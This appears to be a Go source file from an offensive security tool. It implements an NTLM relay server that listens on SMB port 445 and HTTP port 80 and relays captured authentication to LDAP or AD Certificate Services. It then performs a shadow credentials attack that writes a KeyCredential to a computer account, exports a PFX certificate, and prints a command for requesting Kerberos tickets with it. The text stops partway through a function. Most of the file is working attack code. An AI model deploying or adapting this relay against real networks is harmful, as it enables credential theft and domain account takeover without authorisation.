package relay

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
	"github.com/ineffectivecoder/credgoblin/pkg/shadowcreds"
	"github.com/ineffectivecoder/credgoblin/pkg/smb"
)

// Config holds relay configuration
type Config struct {
	ListenAddr   string
	ListenPorts  string // "80", "445", or "both"
	TargetURL    string
	TargetUser   string
	OutputPath   string
	PFXPassword  string
	Verbose      bool
	RelayMode    string // "ldap" or "adcs"
	TemplateName string // Certificate template name for ADCS
}

// Server represents the relay server
type Server struct {
	config           *Config
	logger           *output.Logger
	listener         net.Listener
	httpListener     net.Listener
	onSuccess        func(pfxPath string)
	successMutex     sync.Mutex
	firstSuccessful  bool
	successfulUser   string // Track which user was successfully relayed
	attackInProgress bool   // Flag to block new connections during attack
	handlingConn     bool   // Flag to prevent multiple simultaneous authentications
}

// NewServer creates a new relay server
func NewServer(config *Config, logger *output.Logger) *Server {
	return &Server{
		config: config,
		logger: logger,
	}
}

// extractDomainFromURL extracts the domain from an LDAP URL (e.g., ldap://dc.domain.local -> domain.local)
func extractDomainFromURL(targetURL string) string {
	// Remove scheme
	url := targetURL
	url = strings.TrimPrefix(url, "ldap://")
	url = strings.TrimPrefix(url, "ldaps://")

	// Remove port if present
	if idx := strings.Index(url, ":"); idx != -1 {
		url = url[:idx]
	}

	// If it looks like a hostname (dc.domain.local), extract domain.local
	parts := strings.SplitN(url, ".", 2)
	if len(parts) == 2 {
		return parts[1]
	}

	// Fallback to the full hostname
	return url
}

// domainToBaseDN converts a domain name to LDAP base DN (e.g., "domain.local" -> "DC=domain,DC=local")
func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcParts := make([]string, len(parts))
	for i, part := range parts {
		dcParts[i] = "DC=" + part
	}
	return strings.Join(dcParts, ",")
}

// Start starts the relay server
func (s *Server) Start(ctx context.Context) error {
	addr := s.config.ListenAddr
	if addr == "" {
		addr = "0.0.0.0"
	}

	// Normalize ports config
	ports := s.config.ListenPorts
	if ports == "" {
		ports = "both"
	}

	// Validate ports option
	if ports != "80" && ports != "445" && ports != "both" {
		return fmt.Errorf("invalid ports option: %s (must be 80, 445, or both)", ports)
	}

	// Listen on port 445 for SMB (if requested)
	if ports == "445" || ports == "both" {
		smbAddr := fmt.Sprintf("%s:445", addr)
		listener, err := net.Listen("tcp", smbAddr)
		if err != nil {
			return fmt.Errorf("failed to listen on %s: %w", smbAddr, err)
		}
		s.listener = listener
		s.logger.Info(fmt.Sprintf("Relay server listening on %s", smbAddr))
		go s.acceptLoop(ctx)
	}

	// Listen on port 80 for HTTP (if requested)
	if ports == "80" || ports == "both" {
		httpAddr := fmt.Sprintf("%s:80", addr)
		httpListener, err := net.Listen("tcp", httpAddr)
		if err != nil {
			if s.listener != nil {
				s.listener.Close()
			}
			return fmt.Errorf("failed to listen on %s: %w", httpAddr, err)
		}
		s.httpListener = httpListener
		s.logger.Info(fmt.Sprintf("HTTP relay listener on %s", httpAddr))
		go s.acceptHTTPLoop(ctx)
	}

	s.logger.Info(fmt.Sprintf("Target: %s", s.config.TargetURL))
	s.logger.Info(fmt.Sprintf("Target user: %s", s.config.TargetUser))

	return nil
}

// Stop stops the relay server
func (s *Server) Stop() error {
	if s.listener != nil {
		s.listener.Close()
	}
	if s.httpListener != nil {
		s.httpListener.Close()
	}
	return nil
}

// OnSuccess sets a callback for when relay succeeds
func (s *Server) OnSuccess(callback func(pfxPath string)) {
	s.onSuccess = callback
}

// markFirstSuccess marks this as the first successful relay if it hasn't been marked yet
// Returns true if this is the first success, false if another relay already succeeded
func (s *Server) markFirstSuccess(username string) bool {
	s.successMutex.Lock()
	defer s.successMutex.Unlock()

	if s.firstSuccessful {
		s.logger.Info(fmt.Sprintf("Ignoring relay from %s - already successfully relayed credentials from %s", username, s.successfulUser))
		return false
	}

	s.firstSuccessful = true
	s.successfulUser = username
	return true
}

// acceptLoop accepts incoming SMB connections on port 445
func (s *Server) acceptLoop(ctx context.Context) {
	s.logger.Debug("SMB accept loop started, waiting for connections...")
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				s.logger.Debug("SMB accept loop terminated")
				return
			default:
				s.logger.Error(fmt.Sprintf("SMB accept error: %v", err))
				continue
			}
		}

		go s.handleConnection(ctx, conn)
	}
}

// acceptHTTPLoop accepts incoming HTTP connections on port 80
func (s *Server) acceptHTTPLoop(ctx context.Context) {
	s.logger.Debug("HTTP accept loop started, waiting for connections...")
	for {
		conn, err := s.httpListener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				s.logger.Debug("HTTP accept loop terminated")
				return
			default:
				s.logger.Error(fmt.Sprintf("HTTP accept error: %v", err))
				continue
			}
		}

		go s.handleHTTPConnection(ctx, conn)
	}
}

// handleConnection handles a single connection
func (s *Server) handleConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Info(fmt.Sprintf("New connection from %s (SMB:445)", remoteAddr))

	if s.config.RelayMode == "adcs" {
		// ADCS relay mode
		adcsClient := NewADCSClient(s.config.TargetURL, s.config.TemplateName, s.logger)
		// Mark this as cross-protocol relay (SMB→HTTP) to force raw NTLM
		adcsClient.crossProtocolRelay = true

		handler := &ADCSRelayHandler{
			conn:       conn,
			adcsClient: adcsClient,
			outputPath: s.config.OutputPath,
			pfxPass:    s.config.PFXPassword,
			logger:     s.logger,
			onSuccess:  s.onSuccess,
			server:     s,
		}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("ADCS relay error from %s: %v", remoteAddr, err))
		}
	} else {
		// LDAP relay mode (default)
		ldapClient := NewLDAPClient(s.config.TargetURL, s.logger)

		handler := &RelayHandler{
			conn:         conn,
			ldapClient:   ldapClient,
			targetUser:   s.config.TargetUser,
			targetDomain: extractDomainFromURL(s.config.TargetURL),
			outputPath:   s.config.OutputPath,
			pfxPass:      s.config.PFXPassword,
			logger:       s.logger,
			onSuccess:    s.onSuccess,
			server:       s,
		}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("Relay error from %s: %v", remoteAddr, err))
		}
	}
}

// handleHTTPConnection handles HTTP NTLM authentication relay
func (s *Server) handleHTTPConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()

	// Check if attack is already in progress OR if we're already handling a connection
	s.successMutex.Lock()
	attackInProgress := s.attackInProgress
	alreadyHandling := s.handlingConn
	if !alreadyHandling {
		s.handlingConn = true // Mark that we're handling this one
	}
	s.successMutex.Unlock()

	if attackInProgress || alreadyHandling {
		s.logger.Debug(fmt.Sprintf("Rejecting connection from %s - already handling authentication", remoteAddr))
		return
	}

	s.logger.Info(fmt.Sprintf("New connection from %s (HTTP:80)", remoteAddr))

	if s.config.RelayMode == "adcs" {
		// ADCS relay mode via HTTP
		adcsClient := NewADCSClient(s.config.TargetURL, s.config.TemplateName, s.logger)

		handler := &HTTPRelayHandler{
			conn:       conn,
			adcsClient: adcsClient,
			outputPath: s.config.OutputPath,
			pfxPass:    s.config.PFXPassword,
			logger:     s.logger,
			onSuccess:  s.onSuccess,
			server:     s,
		}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("HTTP ADCS relay error from %s: %v", remoteAddr, err))
		}
	} else {
		// LDAP relay mode via HTTP
		ldapClient := NewLDAPClient(s.config.TargetURL, s.logger)

		handler := &HTTPRelayHandler{
			conn:         conn,
			ldapClient:   ldapClient,
			adcsClient:   nil,
			targetUser:   s.config.TargetUser,
			targetDomain: extractDomainFromURL(s.config.TargetURL),
			outputPath:   s.config.OutputPath,
			pfxPass:      s.config.PFXPassword,
			logger:       s.logger,
			onSuccess:    s.onSuccess,
			server:       s}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("HTTP LDAP relay error from %s: %v", remoteAddr, err))
		}
	}
}

// RelayHandler handles NTLM relay for a single connection
type RelayHandler struct {
	conn              net.Conn
	ldapClient        *LDAPClient
	targetUser        string
	targetDomain      string // Domain for UPN in certificate
	authenticatedUser string // Store the username from Type 3
	outputPath        string
	pfxPass           string
	logger            *output.Logger
	onSuccess         func(pfxPath string)
	server            *Server // Reference to server for success tracking
}

// Handle performs the relay
func (h *RelayHandler) Handle(ctx context.Context) error {
	// Create a done channel for context cancellation
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close()
		case <-done:
		}
	}()

	// Connect to LDAP
	if err := h.ldapClient.Connect(); err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}
	defer h.ldapClient.Close()

	// Process SMB packets
	for {
		// Read NetBIOS header
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		// Read SMB packet
		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		// Process packet
		response, success, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		// Send response
		if response != nil {
			// Debug: log response hex
			if len(response) < 200 {
				h.logger.Debug(fmt.Sprintf("Sending response (%d bytes): %x", len(response), response))
			}
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		// If relay succeeded, perform shadow credentials attack
		if success {
			// Check if this is the first successful relay
			h.logger.Debug(fmt.Sprintf("Relay succeeded, checking first-success status (server=%v)", h.server != nil))
			// Use authenticated user if available, otherwise fall back to target user
			userToCheck := h.authenticatedUser
			if userToCheck == "" {
				userToCheck = h.targetUser
			}
			if h.server != nil && !h.server.markFirstSuccess(userToCheck) {
				h.logger.Info("Another relay already succeeded, skipping shadow credentials attack")
				return nil
			}

			h.logger.Success("NTLM relay successful!")
			return h.performShadowCredentials()
		}
	}
}

// processPacket processes an SMB packet and relays NTLM
func (h *RelayHandler) processPacket(packet []byte) ([]byte, bool, error) {
	if len(packet) < 4 {
		return nil, false, fmt.Errorf("packet too short")
	}

	// Check if SMB1 or SMB2
	if packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB1Packet(packet)
	} else if packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB2Packet(packet)
	}

	return nil, false, fmt.Errorf("unknown protocol")
}

// processSMB2Packet processes an SMB2 packet
func (h *RelayHandler) processSMB2Packet(packet []byte) ([]byte, bool, error) {
	header, err := smb.ParseSMB2Header(packet)
	if err != nil {
		return nil, false, err
	}

	switch header.Command {
	case smb.SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		// Send negotiate response with same parameters as SMB1→SMB2 transition
		response := h.buildSMB2NegotiateResponse(header)
		return response, false, nil

	case smb.SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		return h.handleSessionSetupRelay(packet)

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, false, fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// processSMB1Packet processes an SMB1 packet
func (h *RelayHandler) processSMB1Packet(packet []byte) ([]byte, bool, error) {
	// Check if this is a NEGOTIATE request
	if len(packet) >= 5 && packet[4] == 0x72 { // SMB_COM_NEGOTIATE
		// Parse dialects from SMB1 NEGOTIATE
		dialects, err := h.parseSMB1Dialects(packet)
		if err != nil {
			return nil, false, fmt.Errorf("failed to parse SMB1 dialects: %w", err)
		}

		h.logger.Debug(fmt.Sprintf("Client dialects: %v", dialects))

		// Check if any SMB2 dialect is advertised
		for _, dialect := range dialects {
			if len(dialect) >= 5 && dialect[:5] == "SMB 2" {
				// Client supports SMB2, send SMB2 negotiate response (Responder-style)
				h.logger.Debug(fmt.Sprintf("Client advertised SMB2 (%s), responding with SMB2 NEGOTIATE", dialect))
				response := h.buildSMB2NegotiateFromSMB1(packet)
				return response, false, nil
			}
		}

		// No SMB2 support, reject
		h.logger.Debug("Client doesn't support SMB2, rejecting")
		header, _ := smb.ParseSMB1Header(packet)
		response := smb.BuildSMB1NegotiateResponse(header, 0xFFFF)
		return response, false, nil
	}

	// Other SMB1 commands not supported
	h.logger.Debug("Received unsupported SMB1 command")
	return nil, false, fmt.Errorf("unsupported SMB1 command")
}

// buildSMB2NegotiateFromSMB1 builds an SMB2 NEGOTIATE response from SMB1 request
func (h *RelayHandler) buildSMB2NegotiateFromSMB1(smb1Packet []byte) []byte {
	// Parse SMB1 header to get MID
	smb1Header, _ := smb.ParseSMB1Header(smb1Packet)

	// Build SMB2 NEGOTIATE response with SPNEGO
	response := make([]byte, 128)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // CreditCharge
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Status
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE) // Command
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1) // Credit
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Flags (SERVER_TO_REDIR)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // NextCommand
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(smb1Header.MID)) // MessageID from SMB1 MID
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // TreeID
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0) // SessionID
	offset += 8
	offset += 16 // Signature

	// Negotiate Response Body
	binary.LittleEndian.PutUint16(response[offset:offset+2], 65) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED) // SecurityMode
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202) // DialectRevision (SMB 2.002)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // Reserved
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid) // ServerGuid
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Capabilities
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxTransactSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxReadSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxWriteSize
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // SystemTime
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // ServerStartTime
	offset += 8

	// SPNEGO security blob
	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128)) // SecurityBufferOffset
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob))) // SecurityBufferLength
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved2

	// Append security blob
	response = append(response[:128], securityBlob...)

	return response
}

// buildSMB2NegotiateResponse builds an SMB2 NEGOTIATE response for direct SMB2 requests
func (h *RelayHandler) buildSMB2NegotiateResponse(header *smb.SMB2Header) []byte {
	// Build SMB2 NEGOTIATE response with SPNEGO
	response := make([]byte, 128)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // CreditCharge
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Status
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE) // Command
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1) // Credit
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Flags (SERVER_TO_REDIR)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // NextCommand
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], header.MessageID) // MessageID from request
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // TreeID
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0) // SessionID
	offset += 8
	offset += 16 // Signature

	// Negotiate Response Body
	binary.LittleEndian.PutUint16(response[offset:offset+2], 65) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED) // SecurityMode
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202) // DialectRevision (SMB 2.002)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // Reserved
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid) // ServerGuid
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Capabilities
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxTransactSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxReadSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxWriteSize
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // SystemTime
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // ServerStartTime
	offset += 8

	// SPNEGO security blob
	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128)) // SecurityBufferOffset
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob))) // SecurityBufferLength
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved2

	// Append security blob
	response = append(response[:128], securityBlob...)

	return response
}

// parseSMB1Dialects parses dialect strings from SMB1 NEGOTIATE
func (h *RelayHandler) parseSMB1Dialects(packet []byte) ([]string, error) {
	if len(packet) < 35 {
		return nil, fmt.Errorf("packet too short")
	}

	// SMB1 NEGOTIATE structure:
	// 0-31: SMB header
	// 32: WordCount (should be 0 for NEGOTIATE request)
	// 33-34: ByteCount
	// 35+: Dialects (each prefixed with 0x02 and null-terminated)

	wordCount := packet[32]
	if wordCount != 0 {
		return nil, fmt.Errorf("unexpected WordCount: %d", wordCount)
	}

	byteCount := binary.LittleEndian.Uint16(packet[33:35])
	if len(packet) < 35+int(byteCount) {
		return nil, fmt.Errorf("packet too short for ByteCount")
	}

	var dialects []string
	offset := 35
	end := 35 + int(byteCount)

	for offset < end {
		// Each dialect is prefixed with 0x02
		if packet[offset] != 0x02 {
			break
		}
		offset++

		// Find null terminator
		start := offset
		for offset < end && packet[offset] != 0 {
			offset++
		}

		dialect := string(packet[start:offset])
		dialects = append(dialects, dialect)
		offset++ // Skip null terminator
	}

	return dialects, nil
}

// handleSessionSetupRelay handles SMB2 SESSION_SETUP and relays NTLM
func (h *RelayHandler) handleSessionSetupRelay(packet []byte) ([]byte, bool, error) {
	if len(packet) < 64+9 {
		return nil, false, fmt.Errorf("session setup request too short")
	}

	offset := 64 + 12 // Skip to SecurityBufferOffset field
	securityBufferOffset := binary.LittleEndian.Uint16(packet[offset : offset+2])
	securityBufferLength := binary.LittleEndian.Uint16(packet[offset+2 : offset+4])

	if int(securityBufferOffset)+int(securityBufferLength) > len(packet) {
		return nil, false, fmt.Errorf("security buffer out of bounds")
	}

	securityBlob := packet[securityBufferOffset : securityBufferOffset+securityBufferLength]

	// Unwrap SPNEGO
	ntlmMsg, err := smb.UnwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, false, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	if len(ntlmMsg) < 12 {
		return nil, false, fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		h.logger.Info("Relaying NTLM Type 1 to LDAP...")

		// Forward to LDAP via SICILY unmodified (like ntlmrelayx without --drop-mic)
		type2, err := h.ldapClient.ForwardNegotiate(ntlmMsg)
		if err != nil {
			return nil, false, fmt.Errorf("failed to forward negotiate: %w", err)
		}

		// Wrap in SPNEGO
		spnegoBlob := smb.WrapNTLMInSPNEGO(type2, true)

		// Build SMB2 response
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, false, nil

	case ntlm.NtLmAuthenticate:
		h.logger.Info("Relaying NTLM Type 3 to LDAP...")
		h.logger.Debug(fmt.Sprintf("Type 3 hex (first 100 bytes): %x", ntlmMsg[:min(100, len(ntlmMsg))]))

		// Parse the Type 3 message to extract the username
		parser := ntlm.NewAuthParser()
		authMsg, parseErr := parser.Parse(ntlmMsg)
		if parseErr == nil {
			username := authMsg.GetUserName()
			domain := authMsg.GetDomain()
			workstation := authMsg.GetWorkstation()
			h.logger.Debug(fmt.Sprintf("Parsed - Username: %q, Domain: %q, Workstation: %q", username, domain, workstation))
			h.logger.Debug(fmt.Sprintf("UserName buffer: offset=%d len=%d, DomainName buffer: offset=%d len=%d",
				authMsg.UserName.Offset, authMsg.UserName.Length,
				authMsg.DomainName.Offset, authMsg.DomainName.Length))
			if domain != "" {
				h.authenticatedUser = domain + "\\" + username
			} else {
				h.authenticatedUser = username
			}
			h.logger.Info(fmt.Sprintf("Authenticated user: %s", h.authenticatedUser))
		} else {
			h.logger.Error(fmt.Sprintf("Failed to parse Type 3 for username: %v", parseErr))
		}

		// Forward Type 3 to LDAP via SICILY unmodified (like ntlmrelayx without --drop-mic)
		h.logger.Debug(fmt.Sprintf("Type 3 size: %d bytes", len(ntlmMsg)))
		err := h.ldapClient.ForwardAuthenticate(ntlmMsg)
		if err != nil {
			h.logger.Error(fmt.Sprintf("LDAP authentication failed: %v", err))
			header, _ := smb.ParseSMB2Header(packet)
			response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
			return response, false, err
		}

		// Authentication successful!
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_SUCCESS, 0x1000000000001, nil)
		return response, true, nil

	default:
		return nil, false, fmt.Errorf("unknown NTLM message type: %d", msgType)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *RelayHandler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}

// performShadowCredentials performs the shadow credentials attack
func (h *RelayHandler) performShadowCredentials() error {
	h.logger.Info("Performing shadow credentials attack...")

	// Get base DN from LDAP
	baseDN, err := h.ldapClient.GetBaseDN()
	if err != nil {
		return fmt.Errorf("failed to get base DN: %w", err)
	}

	// Resolve username to DN
	targetUsername := h.targetUser
	if !strings.Contains(targetUsername, "\\") {
		// If no domain prefix, use command line target user
		targetUsername = targetUsername
	} else {
		// Extract username from DOMAIN\USER format
		parts := strings.Split(targetUsername, "\\")
		if len(parts) == 2 {
			targetUsername = parts[1]
		}
	}

	// For computer accounts, construct DN directly instead of searching
	// LDAP searches timeout after SICILY authentication on Windows
	// Computer accounts are typically in CN=Computers,DC=domain,DC=com
	accountName := targetUsername
	if strings.HasSuffix(accountName, "$") {
		accountName = accountName[:len(accountName)-1]
	}
	userDN := fmt.Sprintf("CN=%s,CN=Computers,%s", accountName, baseDN)
	h.logger.Info(fmt.Sprintf("Constructed target DN: %s", userDN))

	// Generate KeyCredential
	keyCredential, err := shadowcreds.NewKeyCredential()
	if err != nil {
		return fmt.Errorf("failed to generate key credential: %w", err)
	}

	// Build KeyCredential blob
	blob, err := keyCredential.BuildKeyCredentialBlob()
	if err != nil {
		return fmt.Errorf("failed to build key credential blob: %w", err)
	}

	// Modify LDAP
	if err := h.ldapClient.ModifyKeyCredential(userDN, blob); err != nil {
		return fmt.Errorf("failed to modify key credential: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Successfully added shadow credentials to %s", h.targetUser))

	// Generate certificate with UPN SAN for PKINIT
	cert, err := keyCredential.GenerateCertificate(h.targetUser, h.targetDomain)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}

	// Export PFX
	pfxPassword, err := shadowcreds.ExportPFX(keyCredential.PrivateKey(), cert, h.pfxPass, h.outputPath)
	if err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", h.outputPath))
	h.logger.Info(fmt.Sprintf("PFX Password: %s", pfxPassword))
	h.logger.Info(fmt.Sprintf("Use with: gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' %s/%s", h.outputPath, pfxPassword, h.targetDomain, h.targetUser))

	if h.onSuccess != nil {
		h.onSuccess(h.outputPath)
	}

	return nil
}

// removeTargetNameFromType2 removes MsvAvTargetName (AVPair ID=9) from the NTLM Type 2 challenge
// This is critical for cross-protocol relay (SMB→HTTP). If MsvAvTargetName is present in Type 2,
// the client will include it in Type 3 with the relay server's hostname (e.g., "cifs/bingbong4").
// The target server (ADCS) will then reject authentication because the SPN doesn't match.
// By removing MsvAvTargetName from Type 2, we prevent the client from including it in Type 3.
func removeTargetNameFromType2(type2 []byte, logger *output.Logger) []byte {
	// Type 2 structure:
	// 0-7: Signature "NTLMSSP\x00"
	// 8-11: MessageType (0x00000002)
	// 12-19: TargetName (length, maxlen, offset)
	// 20-23: Flags
	// 24-31: Challenge
	// 32-39: Context (optional)
	// 40-47: TargetInfo (AVPairs) (length, maxlen, offset)
	// 48+: Version (optional, 8 bytes if NTLMSSP_NEGOTIATE_VERSION is set)

	if len(type2) < 48 {
		logger.Debug("Type 2 too short to modify")
		return type2
	}

	// Read TargetInfo (AVPairs) descriptor
	targetInfoLen := binary.LittleEndian.Uint16(type2[40:42])
	targetInfoOffset := binary.LittleEndian.Uint32(type2[44:48])

	if targetInfoOffset+uint32(targetInfoLen) > uint32(len(type2)) {
		logger.Debug("Invalid TargetInfo offset/length in Type 2")
		return type2
	}

	// Parse AVPairs and look for MsvAvTargetName (ID=9)
	avPairsStart := targetInfoOffset
	offset := avPairsStart
	targetNameOffset := uint32(0)
	targetNameTotalLen := uint32(0)

	for offset < targetInfoOffset+uint32(targetInfoLen)-4 {
		avID := binary.LittleEndian.Uint16(type2[offset : offset+2])
